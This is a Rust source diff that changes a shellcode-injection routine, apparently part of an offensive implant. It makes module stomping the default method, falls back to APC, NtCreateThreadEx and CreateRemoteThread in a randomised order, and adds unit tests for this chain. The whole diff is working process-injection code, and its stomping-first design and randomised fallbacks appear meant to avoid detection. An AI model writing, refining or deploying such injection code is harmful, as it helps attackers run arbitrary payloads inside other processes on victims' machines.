@@ -32,11 +32,11 @@ pub struct InjectResult {
 /// Inject shellcode into target PID and start execution.
 ///
 /// `method`:
-/// - `"nt"` (default): prefer NtCreateThreadEx into remote process
+/// - `"stomping"` / `"module_stomping"`: overwrite a remote module .text, no new RWX alloc
+/// - `"nt"`: prefer NtCreateThreadEx into remote process
 /// - `"crt"`: CreateRemoteThread only
 /// - `"apc"`: QueueUserAPC to an existing thread in the target (non-classic)
-/// - `"stomping"` / `"module_stomping"`: overwrite a remote module .text, no new RWX alloc
-/// - `"auto"`: nt then crt then apc (does **not** auto-stomp — operator must opt in)
+/// - `"auto"` / empty (default): stomping → apc → nt (with soft fallbacks)
 pub fn inject_shellcode(pid: u32, shellcode: &[u8], method: &str) -> Result<InjectResult, String> {
     if pid == 0 {
         return Err("invalid pid".into());
@@ -58,9 +58,16 @@ pub fn normalize_inject_method(method: &str) -> &'static str {
         "apc" => "apc",
         "nt" => "nt",
         "stomping" | "module_stomping" | "stomp" => "stomping",
+        // Default product path: stomping-first auto chain
         "auto" | "" => "auto",
         _ => "auto",
     }
+}
+
+/// Default method selection chain (pure; unit-tested).
+/// Returns ordered method names tried by `auto` / empty.
+pub fn inject_auto_fallback_chain() -> &'static [&'static str] {
+    &["stomping", "apc", "nt"]
 }
 
 fn inject_shellcode_inner(
@@ -75,16 +82,19 @@ fn inject_shellcode_inner(
 
     let m = normalize_inject_method(method);
 
-    // Module stomping: map shellcode into existing remote .text (no VirtualAllocEx).
-    if m == "stomping" {
+    // Module stomping path (also first step of auto).
+    if m == "stomping" || m == "auto" {
         match module_stomp_inject(pid, h_proc, shellcode) {
             Ok(r) => {
                 cleanup_proc(h_proc);
                 return Ok(r);
             }
             Err(e) => {
-                cleanup_proc(h_proc);
-                return Err(e);
+                if m == "stomping" {
+                    cleanup_proc(h_proc);
+                    return Err(e);
+                }
+                // auto: fall through to apc → nt via classic alloc path
             }
         }
     }
@@ -124,32 +134,64 @@ fn inject_shellcode_inner(
                 return Err(e);
             }
         },
-        "nt" => match nt_create_remote_thread(h_proc, remote) {
-            Ok(t) => (t, "nt"),
-            Err(e) => {
-                // soft fallthrough to CRT
-                match create_remote_thread(h_proc, remote) {
-                    Ok(t) => (t, "crt-fallback"),
-                    Err(e2) => {
-                        let _ = remote_free(h_proc, remote);
-                        cleanup_proc(h_proc);
-                        return Err(format!("NtCreateThreadEx: {e}; CreateRemoteThread: {e2}"));
-                    }
+        "nt" => {
+            // 50/50 order: NtCreateThreadEx first vs CreateRemoteThread first.
+            let prefer_nt = crate::utils::random_range(0, 1) == 0;
+            let result = if prefer_nt {
+                nt_create_remote_thread(h_proc, remote)
+                    .map(|t| (t, "nt"))
+                    .or_else(|e| {
+                        create_remote_thread(h_proc, remote)
+                            .map(|t| (t, "crt-fallback"))
+                            .map_err(|e2| format!("NtCreateThreadEx: {e}; CreateRemoteThread: {e2}"))
+                    })
+            } else {
+                create_remote_thread(h_proc, remote)
+                    .map(|t| (t, "crt"))
+                    .or_else(|e| {
+                        nt_create_remote_thread(h_proc, remote)
+                            .map(|t| (t, "nt-fallback"))
+                            .map_err(|e2| format!("CreateRemoteThread: {e}; NtCreateThreadEx: {e2}"))
+                    })
+            };
+            match result {
+                Ok(v) => v,
+                Err(e) => {
+                    let _ = remote_free(h_proc, remote);
+                    cleanup_proc(h_proc);
+                    return Err(e);
                 }
             }
         },
         _ => {
-            // auto: nt → crt → apc
-            if let Ok(t) = nt_create_remote_thread(h_proc, remote) {
-                (t, "nt")
-            } else if let Ok(t) = create_remote_thread(h_proc, remote) {
-                (t, "crt")
-            } else if let Ok(t) = queue_user_apc_inject(pid, h_proc, remote) {
+            // auto after stomping failed: apc first, then randomized nt/crt order
+            if let Ok(t) = queue_user_apc_inject(pid, h_proc, remote) {
                 (t, "apc")
             } else {
-                let _ = remote_free(h_proc, remote);
-                cleanup_proc(h_proc);
-                return Err("nt, crt, and apc remote execution paths failed".into());
+                let prefer_nt = crate::utils::random_range(0, 1) == 0;
+                let chain_ok = if prefer_nt {
+                    nt_create_remote_thread(h_proc, remote)
+                        .map(|t| (t, "nt"))
+                        .or_else(|_| {
+                            create_remote_thread(h_proc, remote).map(|t| (t, "crt"))
+                        })
+                } else {
+                    create_remote_thread(h_proc, remote)
+                        .map(|t| (t, "crt"))
+                        .or_else(|_| {
+                            nt_create_remote_thread(h_proc, remote).map(|t| (t, "nt"))
+                        })
+                };
+                match chain_ok {
+                    Ok(v) => v,
+                    Err(_) => {
+                        let _ = remote_free(h_proc, remote);
+                        cleanup_proc(h_proc);
+                        return Err(
+                            "stomping, apc, nt, and crt remote execution paths failed".into(),
+                        );
+                    }
+                }
             }
         }
     };
@@ -661,6 +703,7 @@ mod inject_method_tests {
         assert_eq!(normalize_inject_method("nt"), "nt");
         assert_eq!(normalize_inject_method("crt"), "crt");
         assert_eq!(normalize_inject_method("auto"), "auto");
+        assert_eq!(normalize_inject_method(""), "auto");
         assert_eq!(normalize_inject_method("stomping"), "stomping");
         assert_eq!(normalize_inject_method("module_stomping"), "stomping");
         assert_eq!(normalize_inject_method("STOMP"), "stomping");
@@ -672,6 +715,15 @@ mod inject_method_tests {
             normalize_inject_method("stomping"),
             normalize_inject_method("nt")
         );
+    }
+
+    #[test]
+    fn auto_fallback_chain_is_stomping_first() {
+        let chain = super::inject_auto_fallback_chain();
+        assert_eq!(chain[0], "stomping");
+        assert!(chain.contains(&"apc"));
+        assert!(chain.contains(&"nt"));
+        assert_eq!(chain.len(), 3);
     }
 
     #[test]
